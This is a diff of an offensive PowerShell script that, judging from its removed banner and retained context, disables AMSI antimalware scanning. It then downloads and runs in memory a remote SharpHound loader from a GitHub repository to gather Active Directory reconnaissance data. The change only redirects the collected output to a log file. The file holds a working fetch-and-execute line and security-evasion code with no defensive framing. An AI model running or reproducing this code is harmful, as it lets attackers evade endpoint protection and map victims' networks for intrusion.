@@ -1,7 +1,3 @@
-Write-Host "AMSI providers' scan interception"
-Write-Host "-- Maor Korkos (@maorkor)"
-Write-Host "-- 64bit implemetation"
-
 $Apis = @"
 using System;
 using System.Runtime.InteropServices;
@@ -41,4 +37,5 @@ while ($AntimalwareProvider -ne 0)
 
 $currentPath = (Get-Item -Path ".\" -Verbose).FullName
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpHound4.ps1')
-Invoke-Sharphound4 -command "-c All,GPOLocalGroup --OutputDirectory $currentPath"
+$sharphoundOutput = Invoke-Sharphound4 -command "-c All,GPOLocalGroup --OutputDirectory $currentPath"
+$sharphoundOutput | Out-File -FilePath "log.txt" -Encoding UTF8
